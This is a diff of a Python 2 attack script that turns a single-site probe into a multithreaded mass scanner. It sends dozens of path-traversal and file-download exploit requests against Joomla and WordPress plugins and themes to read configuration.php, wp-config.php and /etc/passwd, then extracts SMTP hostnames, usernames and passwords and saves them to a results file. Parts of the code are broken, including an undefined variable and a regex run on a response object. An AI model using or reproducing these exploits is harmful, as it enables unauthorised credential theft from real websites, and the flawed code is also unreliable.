@@ -1,31 +1,71 @@
-#!/usr/bin/python
-import os
-import httplib
-from httplib import HTTPConnection
+#!/usr/bin/python2
 import urllib2
-import socket
-from socket import timeout as SocketTimeout
-
-def banner():
-    print '''
-__        ______    ____  __  __ _____ ____
-\ \      / /  _ \  / ___||  \/  |_   _|  _ 
- \ \ /\ / /| |_) | \___ \| |\/| | | | | |_) |
-  \ V  V / |  __/   ___) | |  | | | | |  __/
-   \_/\_/  |_|     |____/|_|  |_| |_| |_|
-   '''
+import re
+import sys
+from multiprocessing import Pool
+from multiprocessing.dummy import Pool as ThreadPool
 
 
-def clearing():
-    if os.name == 'nt':
-        os.system('cls')
-    else:
-        os.system('clear')
+import requests
+import re
+import urllib
+import urllib2
+import os
+import sys
+import codecs
+import binascii
+import json
+import argparse
+from multiprocessing.dummy import Pool
+from time import time as timer
+import time
+from random import sample as rand
+from Queue import Queue
+from platform import system
+from urlparse import urlparse
+from optparse import OptionParser
+from colorama import Fore
+from colorama import Style
+from pprint import pprint
+from colorama import init
+init(autoreset=True)
 
 
-banner()
-website = raw_input('[+] Put Your Fucking List [+] :~# ')
+####### Colors	 ######
+
+fr = Fore.RED
+fc = Fore.YELLOW
+fw = Fore.GREEN
+fg = Fore.BLUE
+sd = Style.NORMAL
+sn = Style.BRIGHT
+sb = Style.NORMAL
+
+######################
+
 shells = [
+    '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php',
+    '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php',
+    '/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=',
+    '/index.php?jat3action=gzip&type=css&file=configuration.php',
+    '/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php',
+    '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1',
+    '/index.php?option=com_cckjseblod&task=download&file=configuration.php',
+    '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php',
+    '/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0',
+    '/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes',
+    '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=',
+    '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php',
+    '/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php',
+    '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php',
+    'index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php',
+    '/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
+    '/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php',
+    '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php',
+    '/index.php?option=com_jetext&task=download&file=../../configuration.php',
+    '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1',
+    '/jojo/index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&type=css&v=1',
+    '/index.php?option=com_download-monitor&file=configuration.php',
     '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php',
     '/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=',
     '/wp-content/themes/epic/includes/download.php?file=../../../../wp-config.php',
@@ -107,37 +147,132 @@ shells = [
     '/wp-content/themes/persuasion/lib/scripts/dl-skin.php',
     '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
     '/wp-content/themes/FR0_theme/down.php?path=../../../wp-config.php']
-
-
 foundshells = []
 
-for shell in shells:
-    site = website.replace('http://', '')
-    host = site + shell
-    conn = httplib.HTTPConnection(site)
-    conn.connect()
-    request = conn.request('GET', shell)
-    response = conn.getresponse()
-    if response.status == 200:
-        print '\n\t' +'[+] Shells => Found %s \n' % host
-        foundshells.append(host)
-    else:
-        print '[-] Not Found %s ' % host
-fpth = os.getcwd()
-fpth2 = fpth + '/Founder.txt'
-fob = open(fpth2, 'w')
-fob.close()
-fob = open(fpth2, 'a')
-fob.writelines(foundshells)
-print 'Found Shells Saved On Founder.txt'
-raw_input('\n Press eter To Aborted ... ')
-exit()
+print '''
+ ____  __  __ _____ ____    _____ ___  _   _ _   _ ____
+/ ___||  \/  |_   _|  _ \  |  ___/ _ \| | | | \ | |  _
+\___ \| |\/| | | | | |_) | | |_ | | | | | | |  \| | | | |
+ ___) | |  | | | | |  __/  |  _|| |_| | |_| | |\  | |_| |
+|____/|_|  |_| |_| |_|     |_|   \___/ \___/|_| \_|____/
+
+        [+] Mass Fuckedz SMTP By En Banglasia [+]\n'''
+
+try:
+    dork = raw_input("[+] Put Your Fucking List [+] :~# ")
+    with codecs.open(dork, mode='r', encoding='ascii', errors='ignore') as f:
+        ooo = f.read().splitlines()
+except IOError:
+    pass
+ooo = list((ooo))
+
+
+def bypass(url):
+
+    try:
+
+                # 25 . rev
+        for shell in shells:
+
+            aCaaxcrevlib = requests.get(url + shell)
+
+            if 'mailfrom' in aCaaxcrevlib.text:
+
+                hoststmp = re.findall("smtphost = '(.*?)';", aCaaxcrevlib.text)
+                userstmp = re.findall("smtpuser = '(.*?)';", aCaaxcrevlib.text)
+                passstmp = re.findall("smtppass = '(.*?)';", aCaaxcrevlib.text)
+                portstmp = re.findall("smtpport = '(.*?)';", aCaaxcrevlib.text)
+                print '\n' + '[+] Simple Mail Protocol Server [+]\n' + '[+] Hostname: ' + hoststmp[0] + '\n' + '[+] Port: ' + \
+                    portstmp[0] + '\n' + '[+] Username: ' + userstmp[0] + '\n' + '[+] Password: ' + passstmp[0] + '\n'
+                open(
+                    'Results/SMTPs.txt',
+                    'a').write(
+                    '[+] Hostname: '+hoststmp[0] +
+                    '\n' +
+                    '[+] Port: '+portstmp[0] +
+                    '\n' +
+                    '[+] Username: '+userstmp[0] +
+                    '\n' +
+                    '[+] Password: '+passstmp[0] +
+                    '\n\n')
+                print '[{}SMTP => Fuckedz] {} {} ===> {}{} Successfully! '.format(
+                    sb, sd, url, fc, fc, sb, fg)
+                sys.exit()
+            else:
+                print '[{}Target] {} {} ===> {}{} SMTP {}{} Not Found '.format(
+                    sb, sd, url, fc, fc, sb, fr)
+
+                # gravity
+        for shell in shells:
+
+            aCaxxgravlib = requests.get(url + shell)
+
+            if 'mailfrom' in aSaaxcewlib.text:
+
+                hoststmp = re.findall("smtphost = '(.*?)';", aCaxxgravlib.text)
+                userstmp = re.findall("smtpuser = '(.*?)';", aCaxxgravlib.text)
+                passstmp = re.findall("smtppass = '(.*?)';", aCaxxgravlib.text)
+                portstmp = re.findall("smtpport = '(.*?)';", aCaxxgravlib.text)
+                print '\n' + '[+] Simple Mail Protocol Server [+]\n' + '[+] Hostname: ' + hoststmp[0] + '\n' + '[+] Port: ' + \
+                    portstmp[0] + '\n' + '[+] Username: ' + userstmp[0] + '\n' + '[+] Password: ' + passstmp[0] + '\n'
+                open(
+                    'Results/SMTPs.txt',
+                    'a').write(
+                    '[+] Hostname: '+hoststmp[0] +
+                    '\n' +
+                    '[+] Port: '+portstmp[0] +
+                    '\n' +
+                    '[+] Username: '+userstmp[0] +
+                    '\n' +
+                    '[+] Password: '+passstmp[0] +
+                    '\n\n')
+                print '[{}SMTP => Fuckedz] {} {} ===> {}{} Successfully! '.format(
+                    sb, sd, url, fc, fc, sb, fg)
+                sys.exit()
+            else:
+                print '[{}Target] {} {} ===> {}{} SMTP {}{} Not Found '.format(
+                    sb, sd, url, fc, fc, sb, fr)
+
+                # priv8
+        for shell in shells:
+
+            text = requests.get(url + shell)
+
+            if 'public' in text:
+
+                hoststmp = re.findall("smtphost = '(.*?)';", text)
+                userstmp = re.findall("smtpuser = '(.*?)';", text)
+                passstmp = re.findall("smtppass = '(.*?)';", text)
+                portstmp = re.findall("smtpport = '(.*?)';", text)
+                print '\n' + '[+] Simple Mail Protocol Server [+]\n' + '[+] Hostname: ' + hoststmp[0] + '\n' + '[+] Port: ' + \
+                    portstmp[0] + '\n' + '[+] Username: ' + userstmp[0] + '\n' + '[+] Password: ' + passstmp[0] + '\n'
+                open(
+                    'Results/SMTPs.txt',
+                    'a').write(
+                    '[+] Hostname: '+hoststmp[0] +
+                    '\n' +
+                    '[+] Port: '+portstmp[0] +
+                    '\n' +
+                    '[+] Username: '+userstmp[0] +
+                    '\n' +
+                    '[+] Password: '+passstmp[0] +
+                    '\n\n')
+                print '[{}SMTP => Fuckedz] {} {} ===> {}{} Successfully! '.format(
+                    sb, sd, url, fc, fc, sb, fg)
+                sys.exit()
+            else:
+                print '[{}Target] {} {} ===> {}{} SMTP {}{} Not Found '.format(
+                    sb, sd, url, fc, fc, sb, fr)
+
+    except BaseException:
+        pass
+
 
 def Main():
     try:
-        
+
         start = timer()
-        ThreadPool = Pool(20)
+        ThreadPool = Pool(40)
         Threads = ThreadPool.map(bypass, ooo)
         print('Time: ' + str(timer() - start) + ' seconds')
     except BaseException:
